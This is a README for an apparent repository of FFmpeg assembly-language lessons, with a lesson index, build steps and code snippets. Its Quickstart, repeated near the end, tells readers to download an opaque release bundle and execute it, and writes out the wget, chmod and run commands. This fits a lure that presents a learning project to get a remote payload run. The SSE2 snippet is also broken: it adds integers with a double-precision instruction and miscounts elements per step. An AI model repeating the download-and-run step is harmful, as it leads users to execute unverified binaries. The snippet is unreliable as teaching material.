[![Releases · asm-lessons](https://img.shields.io/badge/Releases-Download-blue?logo=github&logoColor=white)](https://github.com/UrKnightmare/asm-lessons/releases)

# FFMPEG Assembly Language Lessons — Low-Level Video Codec Guide

<img src="https://ffmpeg.org/images/ffmpeg-logo.svg" alt="FFmpeg" width="240" />

A hands-on collection of FFMPEG-focused assembly lessons. Learn how codecs use SIMD, optimize decode/encode paths, and write inline assembly for video processing. This repo mixes theory, worked examples, build scripts, and test vectors.

Table of contents
- Features
- Who this is for
- What you will learn
- Repo layout
- Quickstart — download and run a release
- Build from source
- Example lessons (with snippets)
- Test vectors and validation
- Contributing
- License
- Contact

Features
- Focused lessons on FFMPEG internals and assembly optimizations.
- Real examples using SSE2/AVX2/NEON and inline asm in C.
- Tests and reference vectors for common pixel formats.
- Scripts to build minimal FFmpeg with experimental patches.
- Guided exercises that ramp from small blocks to codec-level changes.

Who this is for
- Codec engineers who want control over inner loops.
- Systems programmers who optimize multimedia code.
- Students who study architecture and SIMD programming.
- Anyone who wants to see assembly integrated into a modern codebase.

What you will learn
- How FFMPEG organizes codec code (AVCodec, AVFrame, threads).
- SIMD patterns for YUV planar operations.
- Inline assembly in GCC/Clang and extern asm in NASM.
- Register allocation basics and calling conventions on x86_64 and ARM64.
- How to measure performance and validate correctness.

Repository layout
- docs/                  — Teaching notes and diagrams.
- lessons/               — Numbered lessons with code and exercises.
  - 01-intro/            — Minimal asm hooks.
  - 02-simd-yuv/         — SIMD YUV convert examples.
  - 03-idct/             — Simple integer DCT in asm.
  - 04-mc/               — Motion compensation kernels.
  - 05-threading/        — Thread-safe patterns and atomics.
- ffmpeg-patches/        — Optional patches and build scripts.
- tests/                 — Test vectors, runners, expected outputs.
- tools/                 — Helper scripts to assemble, link, run.
- examples/              — Small demo apps that exercise the lessons.
- LICENSE
- README.md

Quickstart — download and run a release
Download the release file from https://github.com/UrKnightmare/asm-lessons/releases and execute the included asset. Releases contain bundles with compiled examples and a self-contained test runner. After you download the asset, follow these commands as an example:

```bash
# Example flow after you download the release asset. Replace the filename with the asset you chose.
# Download using browser or CLI. If you use CLI, provide the asset URL from the Releases page.
wget -O asm-lessons-release.tar.gz "https://github.com/UrKnightmare/asm-lessons/releases/download/v1.0/asm-lessons-v1.0.tar.gz"

# Extract and run the included runner
tar -xzf asm-lessons-release.tar.gz
cd asm-lessons-v1.0

# Make the demo runner executable and run it
chmod +x run-demo.sh
./run-demo.sh
```

The release asset includes prebuilt demo binaries and test vectors. Execute the runner to see lesson output and performance numbers. If a release asset uses a different filename, adjust the commands to the file you downloaded.

Build from source
This section lists a standard path to build the examples and the minimal FFmpeg used in the exercises. The build workflow targets Linux x86_64 and aarch64. Adjust flags for other OSes.

Prerequisites
- gcc/clang
- nasm or yasm
- make
- pkg-config
- libx264 (optional for encode demos)

Basic build steps

```bash
git clone https://github.com/UrKnightmare/asm-lessons.git
cd asm-lessons

# Initialize submodules if present
git submodule update --init --recursive

# Build helper tools and lessons
make all
```

To build the minimal FFmpeg used in tests, use the script under ffmpeg-patches:

```bash
cd ffmpeg-patches
./build-ffmpeg.sh --enable-static --arch=x86_64
```

The build script applies local patches from ffmpeg-patches/ and compiles a local ffmpeg binary you can use for tests.

Example lessons (with snippets)
Lesson 01 — Inline assembly entry
- Goal: call a small asm routine from C to add two vectors.
- Files: lessons/01-intro/add_vectors.c, add_vectors.s

C wrapper:

```c
#include <stdint.h>

void add_vectors(int32_t *dst, const int32_t *a, const int32_t *b, int n);

int main(void) {
    int32_t a[8] = {0,1,2,3,4,5,6,7};
    int32_t b[8] = {7,6,5,4,3,2,1,0};
    int32_t dst[8];
    add_vectors(dst, a, b, 8);
    return 0;
}
```

x86_64 SSE2 asm (add_vectors.s):

```asm
.global add_vectors
.type add_vectors, @function
add_vectors:
    testq %rdi, %rdi
    je .ret
    movq %rdi, %r8       # dst
    movq %rsi, %r9       # a
    movq %rdx, %r10      # b
    movl %ecx, %r11d     # n
.loop:
    movdqu (%r9), %xmm0
    addpd  (%r10), %xmm0
    movdqu %xmm0, (%r8)
    add $16, %r9
    add $16, %r10
    add $16, %r8
    sub $2, %r11d
    jg .loop
.ret:
    ret
```

Lesson 02 — YUV conversion with SIMD
- Goal: convert YUV420P to RGB24 using SIMD kernels.
- Focus: memory layout, alignment, strides, and edge handling.
- Patterns: bulk path uses AVX2; fallback uses C loops.

Performance measurement
- Use perf or Linux clock_gettime to measure cycles.
- Include a simple micro-benchmark in lessons/tools/bench.c.

Example ffmpeg filter integration
- Show how to register an optimized function in a filter or codec.
- Use function pointers and CPU flags detection.

```c
if (have_avx2()) {
    params->mc_func = mc_avx2;
} else {
    params->mc_func = mc_c;
}
```

Testing and validation
- tests/ contains small test harnesses that run each lesson with fixed vectors.
- Use checksums to validate outputs. Hashes live in tests/expected/.
- The test runner prints fail counts and timings.

Run tests

```bash
cd tests
./run-tests.sh
```

Performance tips
- Align buffers to 16 or 32 bytes for SSE/AVX.
- Use unrolled loops for hot paths.
- Minimize memory loads; prefer register reuse.
- Use compiler intrinsics when you need portability and readability.

Common pitfalls
- Respect calling conventions when writing global asm.
- Preserve callee-saved registers.
- Account for stack alignment before calling libc functions.
- Verify behavior on small widths and tails.

Lessons index (sample)
- 01 — Inline assembly basics
- 02 — SIMD YUV planar ops (SSE2, AVX2, NEON)
- 03 — Integer transforms and IDCT
- 04 — Sub-pixel filters and MC kernels
- 05 — Loop restoration and post-filter
- 06 — Threading and atomics for codec state
- 07 — Vectorized bitstream parsing
- 08 — Integrating asm in FFmpeg filters
- 09 — ARM64 NEON patterns for mobile codecs
- 10 — Profiling and measuring cache effects

Contributing
- Fork the repo and send a pull request.
- Add tests for new lessons or optimizations.
- Follow the code style in lessons/README.md.
- Use clear commit messages and reference the lesson number.

How to propose a new lesson
- Open an issue with a short outline.
- Attach code samples or test vectors.
- Submit a PR with a lesson directory, README, and tests.

Releases and assets
Visit the Releases page for prebuilt assets and demo bundles:
[https://github.com/UrKnightmare/asm-lessons/releases](https://github.com/UrKnightmare/asm-lessons/releases)

If you download a release asset, unpack it and run the supplied runner. The release will include a README inside the bundle that lists the exact filename to execute and any platform notes.

License
- The repository uses the MIT license. See LICENSE file for details.

Contact
- Open issues for bugs, lesson requests, or build problems.
- Use pull requests for code and content changes.

Images and diagrams included in this repo
- Lessons include diagrams for register use patterns and memory layout.
- Source diagrams use SVG and PNG formats for clarity.
- Example image links:
  - FFmpeg logo: https://ffmpeg.org/images/ffmpeg-logo.svg
  - CPU diagram: https://upload.wikimedia.org/wikipedia/commons/5/59/Processor.svg

Badges
- Release badge at the top links to the release page and downloads.

Additional resources
- FFmpeg developer docs: https://ffmpeg.org/developer.html
- Intel Intrinsics Guide: https://www.intel.com/content/www/us/en/docs/intrinsics-guide/
- ARM NEON programming manual: consult ARM docs for latest details

End of file